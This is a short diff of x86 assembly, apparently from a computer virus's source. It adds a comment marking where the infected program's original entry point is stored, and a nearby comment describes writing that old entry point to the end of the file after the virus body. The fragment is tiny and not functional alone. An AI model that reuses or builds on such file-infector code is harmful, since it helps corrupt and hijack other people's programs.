@@ -246,7 +246,7 @@ _start:
     mov eax,0
     
     mov eax,ebp
-    sub eax,64
+    sub eax,64 ; [ebp-64] original entry point
     write dword[ebp-Local_1_EBP_OFFSET],eax,4; write old enetry to end of file after end virus, old entery is adress to we write 4 bytes
 
 
